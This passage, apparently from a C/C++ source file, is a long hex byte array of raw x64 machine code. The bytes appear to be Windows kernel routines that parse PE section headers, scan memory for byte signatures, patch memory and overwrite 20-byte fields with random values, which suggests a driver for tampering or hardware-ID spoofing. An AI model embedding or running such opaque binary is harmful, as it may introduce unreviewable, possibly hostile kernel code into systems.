	0x89, 0x44, 0x24, 0x08, 0xEB, 0x0D, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0xFF, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x3D, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x0F, 0xB6, 0x00, 0x88, 0x04, 0x24, 0x48, 0x0F, 0xBE, 0x04, 0x24, 0x48,
	0x8B, 0x4C, 0x24, 0x08, 0x48, 0x33, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
	0x44, 0x24, 0x08, 0x48, 0xB8, 0xB3, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x0F, 0xAF, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x08, 0xEB, 0xAA, 0x48, 0x8B, 0x44, 0x24,
	0x08, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x6B,
	0x44, 0x24, 0x10, 0x10, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x03, 0x41,
	0x02, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24,
	0x08, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0xC1, 0xE0, 0x14, 0xC3, 0xCC,
	0x4C, 0x89, 0x4C, 0x24, 0x20, 0x44, 0x88, 0x44, 0x24, 0x18, 0x48, 0x89,
	0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81, 0xEC, 0xD8,
	0x00, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x75, 0x0A, 0xB8, 0x22, 0x00, 0x00, 0xC0, 0xE9, 0x10, 0x02, 0x00, 0x00,
	0x48, 0x83, 0xBC, 0x24, 0x08, 0x01, 0x00, 0x00, 0x00, 0x75, 0x14, 0x48,
	0x8D, 0x0D, 0xBE, 0x8E, 0x00, 0x00, 0xE8, 0x79, 0x1F, 0x00, 0x00, 0x48,
	0x89, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x08,
	0x01, 0x00, 0x00, 0x00, 0x75, 0x0A, 0xB8, 0x22, 0x00, 0x00, 0xC0, 0xE9,
	0xDC, 0x01, 0x00, 0x00, 0xE8, 0xE7, 0xF8, 0xFF, 0xFF, 0x48, 0x89, 0x44,
	0x24, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x68, 0x48, 0x89, 0x44, 0x24, 0x70,
	0x48, 0x8B, 0x8C, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,
	0x70, 0xFF, 0x15, 0xCD, 0x7D, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x50,
	0x48, 0x83, 0x7C, 0x24, 0x50, 0x00, 0x75, 0x0A, 0xB8, 0x22, 0x00, 0x00,
	0xC0, 0xE9, 0x9E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x0F,
	0xB7, 0x40, 0x14, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x8D, 0x44, 0x01,
	0x18, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24, 0x58, 0x48,
	0x89, 0x44, 0x24, 0x40, 0xEB, 0x0E, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48,
	0x83, 0xC0, 0x28, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24,
	0x50, 0x0F, 0xB7, 0x40, 0x06, 0x48, 0x6B, 0xC0, 0x28, 0x48, 0x8B, 0x4C,
	0x24, 0x58, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x39, 0x44, 0x24,
	0x40, 0x0F, 0x83, 0x44, 0x01, 0x00, 0x00, 0x0F, 0xAE, 0xE8, 0xE8, 0xC1,
	0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8B, 0x44, 0x24,
	0x78, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94,
	0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xB8, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x29,
	0x7D, 0x00, 0x00, 0xE8, 0x8C, 0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24,
	0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x8C,
	0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x8C, 0x24, 0x90, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xEE, 0x7C,
	0x00, 0x00, 0x90, 0xE8, 0xC0, 0xF9, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24,
	0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x48,
	0x8D, 0x94, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xB8,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0xFF,
	0x15, 0xAF, 0x7C, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0x85, 0x00, 0x00,
	0x00, 0x0F, 0xAE, 0xE8, 0x48, 0xC7, 0x44, 0x24, 0x60, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x8B, 0x40, 0x08, 0x48, 0x8B, 0x4C,
	0x24, 0x40, 0x8B, 0x49, 0x0C, 0x48, 0x8B, 0x94, 0x24, 0x08, 0x01, 0x00,
	0x00, 0x48, 0x03, 0xD1, 0x48, 0x8B, 0xCA, 0xC7, 0x44, 0x24, 0x30, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x60, 0x48, 0x89, 0x54, 0x24,
	0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4C, 0x8B, 0xC9, 0x4C, 0x8B, 0x84,
	0x24, 0xF8, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x94, 0x24, 0xF0, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x8C, 0x24, 0xE8, 0x00, 0x00, 0x00, 0xE8, 0x3E, 0x00,
	0x00, 0x00, 0x89, 0x44, 0x24, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x7C,
	0x19, 0x0F, 0xAE, 0xE8, 0x48, 0x8B, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x89, 0x08, 0x8B, 0x44, 0x24, 0x48,
	0xEB, 0x0A, 0xE9, 0x8B, 0xFE, 0xFF, 0xFF, 0xB8, 0x22, 0x00, 0x00, 0xC0,
	0x48, 0x81, 0xC4, 0xD8, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x89, 0x44,
	0x24, 0x18, 0x88, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48,
	0x83, 0xEC, 0x28, 0x48, 0x83, 0x7C, 0x24, 0x58, 0x00, 0x74, 0x10, 0x48,
	0x83, 0x7C, 0x24, 0x30, 0x00, 0x74, 0x08, 0x48, 0x83, 0x7C, 0x24, 0x48,
	0x00, 0x75, 0x0A, 0xB8, 0x22, 0x00, 0x00, 0xC0, 0xE9, 0x09, 0x01, 0x00,
	0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44,
	0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0D, 0x48, 0x8B, 0x44, 0x24,
	0x18, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x44,
	0x24, 0x40, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x2B, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x39, 0x44, 0x24, 0x18, 0x0F, 0x83, 0xC9, 0x00, 0x00, 0x00,
	0xC6, 0x04, 0x24, 0x01, 0x48, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00,
	0x00, 0xEB, 0x0D, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0xFF, 0xC0, 0x48,
	0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x39, 0x44,
	0x24, 0x10, 0x73, 0x54, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x4C,
	0x24, 0x30, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xB6, 0x00, 0x0F,
	0xB6, 0x4C, 0x24, 0x38, 0x3B, 0xC1, 0x74, 0x36, 0x48, 0x8B, 0x44, 0x24,
	0x10, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
	0x0F, 0xB6, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x48, 0x8B, 0x54, 0x24,
	0x18, 0x48, 0x03, 0xD1, 0x48, 0x8B, 0xCA, 0x48, 0x8B, 0x54, 0x24, 0x48,
	0x0F, 0xB6, 0x0C, 0x0A, 0x3B, 0xC1, 0x74, 0x06, 0xC6, 0x04, 0x24, 0x00,
	0xEB, 0x02, 0xEB, 0x93, 0x0F, 0xB6, 0x04, 0x24, 0x85, 0xC0, 0x74, 0x40,
	0x8B, 0x44, 0x24, 0x04, 0x89, 0x44, 0x24, 0x0C, 0x8B, 0x44, 0x24, 0x60,
	0x89, 0x44, 0x24, 0x08, 0x8B, 0x44, 0x24, 0x04, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x04, 0x8B, 0x44, 0x24, 0x08, 0x39, 0x44, 0x24, 0x0C, 0x75, 0x1C,
	0x48, 0x8B, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x89, 0x01,
	0x33, 0xC0, 0xEB, 0x0A, 0xE9, 0x0F, 0xFF, 0xFF, 0xFF, 0xB8, 0x25, 0x02,
	0x00, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81, 0xEC,
	0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00,
	0x83, 0x38, 0x00, 0x75, 0x0A, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0xFD,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
	0xE8, 0xBF, 0xF7, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B,
	0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x63, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x48,
	0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B,
	0x44, 0x24, 0x48, 0xFF, 0x15, 0x53, 0x7A, 0x00, 0x00, 0x89, 0x44, 0x24,
	0x28, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x7C, 0x08, 0x48, 0x83, 0x7C, 0x24,
	0x20, 0x00, 0x75, 0x0A, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0x9E, 0x00,
	0x00, 0x00, 0xE8, 0x39, 0xFA, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x50,
	0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B,
	0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x4C, 0x24,
	0x58, 0x48, 0x8B, 0x44, 0x24, 0x60, 0xFF, 0x15, 0x08, 0x7A, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x83, 0x7C, 0x24, 0x30, 0x00, 0x75,
	0x07, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x5C, 0x41, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x48, 0x8B, 0x84, 0x24, 0x90,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x08, 0xE8, 0x60, 0x4C, 0x00, 0x00,
	0xE8, 0x8B, 0xF5, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B,
	0x44, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x44, 0x24,
	0x68, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0x48,
	0x8B, 0x44, 0x24, 0x78, 0xFF, 0x15, 0xAA, 0x79, 0x00, 0x00, 0xC6, 0x05,
	0x4F, 0x8A, 0x00, 0x00, 0x01, 0x33, 0xC0, 0xEB, 0x07, 0xB8, 0x01, 0x00,
	0x00, 0xC0, 0xEB, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x89, 0x44, 0x24,
	0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0xEB,
	0x27, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44,
	0x24, 0x08, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0xFF, 0xC0, 0x48, 0x89,
	0x44, 0x24, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x48, 0xFF, 0xC0, 0x48,
	0x89, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x00,
	0x85, 0xC0, 0x74, 0x27, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x00,
	0x83, 0xF8, 0x78, 0x75, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x0F, 0xBE,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x10, 0x0F, 0xBE, 0x09, 0x3B, 0xC1, 0x74,
	0x04, 0x33, 0xC0, 0xEB, 0x07, 0xEB, 0xA6, 0xB8, 0x01, 0x00, 0x00, 0x00,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x57, 0x48, 0x81,
	0xEC, 0x10, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x9C, 0x5A, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xE8, 0x5D,
	0x1D, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x83, 0x7C, 0x24,
	0x30, 0x00, 0x75, 0x0A, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xE9, 0x3E, 0x03,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x7F, 0x5A, 0x00, 0x00, 0x48, 0x89, 0x84,
	0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x80, 0x5A, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x81,
	0x5A, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x92, 0x5A, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x03, 0x59, 0x00, 0x00, 0x48, 0x89, 0x84,
	0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x14, 0x59, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x25,
	0x59, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x26, 0x59, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xB0, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x67, 0x5A, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x68, 0x48, 0x8D, 0x05, 0x7B, 0x5A, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8D, 0x05, 0x8F, 0x5A, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x78, 0x48, 0x8D, 0x05, 0xA3, 0x5A, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x70, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x4C,
	0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x54, 0x24, 0x68, 0x48, 0x8B, 0x4C,
	0x24, 0x30, 0xE8, 0x81, 0x14, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20,
	0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x19, 0x4C, 0x8B, 0x44, 0x24,
	0x70, 0x48, 0x8B, 0x54, 0x24, 0x78, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8,
	0x60, 0x14, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C,
	0x24, 0x20, 0x00, 0x0F, 0x85, 0xA6, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x84,
	0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x88, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x35, 0x14, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x7F,
	0x4C, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24,
	0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x0E, 0x14,
	0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C, 0x24, 0x20,
	0x00, 0x75, 0x58, 0x4C, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x94, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30,
	0xE8, 0xE7, 0x13, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83,
	0x7C, 0x24, 0x20, 0x00, 0x75, 0x31, 0x4C, 0x8B, 0x84, 0x24, 0xB0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x4C, 0x24, 0x30, 0xE8, 0xC0, 0x13, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x20, 0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x0A, 0xB8, 0x01, 0x00,
	0x00, 0x00, 0xE9, 0xA1, 0x01, 0x00, 0x00, 0x41, 0xB8, 0x07, 0x00, 0x00,
	0x00, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0xE8,
	0xB4, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x83, 0x7C,
	0x24, 0x48, 0x00, 0x75, 0x0A, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xE9, 0x75,
	0x01, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x8B, 0xF8, 0x33,
	0xC0, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0xE8, 0x07, 0xF6, 0xFF,
	0xFF, 0x48, 0x89, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xC8, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48, 0x8B, 0x84, 0x24, 0xC8, 0x00,
	0x00, 0x00, 0xFF, 0x15, 0xC4, 0x76, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x38,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x40, 0xEB, 0x0D, 0x48, 0x8B, 0x44, 0x24, 0x40,
	0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x83, 0x7C, 0x24,
	0x40, 0x00, 0x0F, 0x84, 0xEE, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,
	0x40, 0x48, 0x83, 0xC0, 0x48, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x00, 0x00,
	0x00, 0xE8, 0x06, 0xF2, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xD0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x40, 0x08, 0x48, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xE8, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x8C, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xE8, 0x00,
	0x00, 0x00, 0xFF, 0x15, 0x34, 0x76, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F,
	0x84, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x83,
	0xC0, 0x18, 0x48, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0xC7, 0x44,
	0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x28,
	0xFF, 0xC0, 0x89, 0x44, 0x24, 0x28, 0x83, 0x7C, 0x24, 0x28, 0x14, 0x73,
	0x4C, 0xE8, 0x12, 0xF2, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xF0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0xF8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48,
	0x8B, 0x84, 0x24, 0xF8, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xCF, 0x75, 0x00,
	0x00, 0x33, 0xD2, 0xB9, 0xFF, 0x00, 0x00, 0x00, 0xF7, 0xF1, 0x8B, 0xC2,
	0x8B, 0x4C, 0x24, 0x28, 0x48, 0x8B, 0x94, 0x24, 0x00, 0x01, 0x00, 0x00,
	0x88, 0x04, 0x0A, 0xEB, 0xA3, 0xC7, 0x44, 0x24, 0x38, 0x01, 0x00, 0x00,
	0x00, 0xE9, 0xF9, 0xFE, 0xFF, 0xFF, 0x83, 0x7C, 0x24, 0x38, 0x00, 0x75,
	0x09, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x08, 0xEB, 0x04, 0x33, 0xC0,
	0xEB, 0x02, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x10, 0x01, 0x00, 0x00, 0x5F,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x56, 0x57, 0x48,
	0x81, 0xEC, 0xD8, 0x00, 0x00, 0x00, 0xE8, 0xBD, 0x1C, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x58, 0x48, 0x83, 0x7C, 0x24, 0x58, 0x00, 0x75, 0x0A,
	0xB8, 0x01, 0x00, 0x00, 0x00, 0xE9, 0xEC, 0x02, 0x00, 0x00, 0xE8, 0xA1,
	0xF3, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24,
	0x68, 0x48, 0x89, 0x44, 0x24, 0x70, 0xB2, 0x01, 0x48, 0x8B, 0x4C, 0x24,
	0x58, 0x48, 0x8B, 0x44, 0x24, 0x70, 0xFF, 0x15, 0x28, 0x75, 0x00, 0x00,
	0xC6, 0x44, 0x24, 0x20, 0x00, 0xE8, 0xE6, 0x1F, 0x00, 0x00, 0x88, 0x44,
	0x24, 0x21, 0xC7, 0x44, 0x24, 0x24, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A,
	0x8B, 0x44, 0x24, 0x24, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x24, 0x83, 0x7C,
	0x24, 0x24, 0x32, 0x0F, 0x83, 0x7E, 0x01, 0x00, 0x00, 0x0F, 0xAE, 0xE8,
	0xE8, 0xDB, 0x1B, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x24, 0x48, 0x6B, 0xC9,
	0x28, 0x48, 0x03, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x4C,
	0x24, 0x30, 0xE8, 0x01, 0x20, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x02, 0xEB,
	0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0xF1, 0x1F, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x60, 0x0F, 0xB6, 0x44, 0x24, 0x20, 0x85, 0xC0, 0x74, 0x4E,
	0xE8, 0x9F, 0x1B, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x24, 0xFF, 0xC9, 0x8B,
	0xC9, 0x48, 0x6B, 0xC9, 0x28, 0x48, 0x03, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x78, 0x41, 0xB8, 0x28, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x30,
	0x48, 0x8B, 0x4C, 0x24, 0x78, 0xE8, 0x06, 0x50, 0x00, 0x00, 0x90, 0x83,
	0x7C, 0x24, 0x24, 0x31, 0x75, 0x13, 0x41, 0xB8, 0x28, 0x00, 0x00, 0x00,
	0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0xAC, 0x52, 0x00, 0x00,
	0x90, 0xE9, 0xEC, 0x00, 0x00, 0x00, 0xE8, 0xC1, 0xEF, 0xFF, 0xFF, 0x48,
	0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xF0,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x89, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x48,
	0x8B, 0xD0, 0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x20, 0x74, 0x00, 0x00,
	0x0F, 0xB6, 0xC0, 0x85, 0xC0, 0x0F, 0x84, 0x93, 0x00, 0x00, 0x00, 0x48,
